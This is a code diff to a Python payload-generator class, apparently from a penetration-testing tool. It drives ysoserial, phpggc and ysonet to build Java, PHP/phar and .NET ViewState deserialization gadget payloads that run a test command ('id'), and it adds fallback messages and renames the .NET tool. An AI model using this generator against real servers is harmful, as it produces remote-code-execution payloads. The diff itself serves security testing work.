@@ -162,6 +162,13 @@ class PayloadMutation:
                 else:
                     print(f"[-] Failed: {chain}")
 
+        if not results:
+            return [{
+                "error": "ysoserial-all.jar found but could not execute any chain",
+                "hint": "Check that 'java' is installed and on PATH (run 'java -version' to verify)",
+                "command": f"java -jar {os.path.abspath(self.YSOSERIAL_PATH)} {chains[0]} 'id'",
+            }]
+
         return results
 
 
@@ -384,7 +391,14 @@ class PayloadMutation:
                     if result:
                         results.append(self._make_payload("php_object", chain, cmd, result))
                         print(f"[+] Generated: {chain}")
-                        
+
+        if not results:
+            return [{
+                "error": "phpggc found but could not execute any chain",
+                "hint": "Check that 'php' is installed and on PATH (run 'php -version' to verify)",
+                "command": f"php {self.PHPGGC_PATH} {chains[0]} system id -b",
+            }]
+
         return results
     
     
@@ -394,13 +408,13 @@ class PayloadMutation:
             result = subprocess.run(cmd, capture_output=True, timeout=15)
 
             if result.returncode == 0 and result.stdout:
-                return result.stdout.decode().strip() 
-            return None 
+                return result.stdout.decode().strip()
+            return None
         except subprocess.TimeoutExpired:
             print(f"[!] Timeout: {chain}")
             return None
-        except FileNotFoundError:
-            print("[!] php not found")
+        except (FileNotFoundError, PermissionError, OSError) as e:
+            print(f"[!] Could not run php/phpggc: {e}")
             return None
         
     def __resolve_php_chain(self) -> list[str]:
@@ -695,7 +709,11 @@ class PayloadMutation:
         return results
 
 
-    YSOSERIALNET_PATH = get_tool_path("ysoserial_net")
+    # ysonet (irsdl/ysonet) — fork/replacement dang duoc maintain tich cuc cua
+    # ysoserial.net goc (pwntester/ysoserial.net, gan nhu ngung cap nhat). Gadget
+    # mode dung dung -g/-f/-c/-o giong cu phap cu, nen chi can doi ten file/bien,
+    # khong can doi cach build command.
+    YSONET_PATH = get_tool_path("ysonet")
 
     DOTNET_TEST_COMMANDS = TEST_COMMANDS
 
@@ -718,10 +736,10 @@ class PayloadMutation:
                 return formatter
         return "BinaryFormatter"
 
-    def _run_ysoserialnet(self, formatter: str, gadget: str, command: str) -> str | None:
+    def _run_ysonet(self, formatter: str, gadget: str, command: str) -> str | None:
         try:
             cmd = [
-                self.YSOSERIALNET_PATH,
+                self.YSONET_PATH,
                 "-f", formatter,
                 "-g", gadget,
                 "-c", command,
@@ -735,27 +753,34 @@ class PayloadMutation:
             print(f"[!] Timeout: {gadget}")
             return None
         except (FileNotFoundError, PermissionError, OSError) as e:
-            print(f"[!] Could not run ysoserial.net: {e}")
+            print(f"[!] Could not run ysonet: {e}")
             return None
 
     def _mutate_dotnet_viewstate(self) -> Mutations:
         results: Mutations = []
         formatter = self._resolve_dotnet_formatter()
 
-        if not os.path.exists(self.YSOSERIALNET_PATH):
+        if not os.path.exists(self.YSONET_PATH):
             return [{
-                "error": "ysoserial.net not found",
-                "hint": f"Place ysoserial.exe at: {self.YSOSERIALNET_PATH}",
-                "command": f"ysoserial.exe -f {formatter} -g TypeConfuseDelegate -c 'id' -o base64",
+                "error": "ysonet not found",
+                "hint": f"Download from https://github.com/irsdl/ysonet/releases and place ysonet.exe at: {self.YSONET_PATH}",
+                "command": f"ysonet.exe -f {formatter} -g TypeConfuseDelegate -c 'id' -o base64",
             }]
 
         for gadget in self.DOTNET_GADGETS:
             for cmd in self.DOTNET_TEST_COMMANDS:
-                b64 = self._run_ysoserialnet(formatter, gadget, cmd)
+                b64 = self._run_ysonet(formatter, gadget, cmd)
                 if b64:
                     payload = self._make_payload("dotnet_deser", f"{formatter}/{gadget}", cmd, b64)
                     payload["note"] = "For ViewState, target must have MAC validation disabled or key must be known/leaked"
                     results.append(payload)
+
+        if not results:
+            return [{
+                "error": "ysonet found but could not execute any gadget",
+                "hint": "Check that the .NET runtime/mono is available to run ysonet.exe",
+                "command": f"{self.YSONET_PATH} -f {formatter} -g {self.DOTNET_GADGETS[0]} -c 'id' -o base64",
+            }]
 
         return results
 
@@ -846,6 +871,13 @@ class PayloadMutation:
                         "file-operation sink (file_exists, is_file, fopen, etc.)"
                     )
                     results.append(payload)
+
+        if not results:
+            return [{
+                "error": "phpggc found but could not execute any chain",
+                "hint": "Check that 'php' is installed and on PATH (run 'php -version' to verify)",
+                "command": f"php {self.PHPGGC_PATH} {chains[0]} system id -p phar -o payload.phar",
+            }]
 
         return results
 
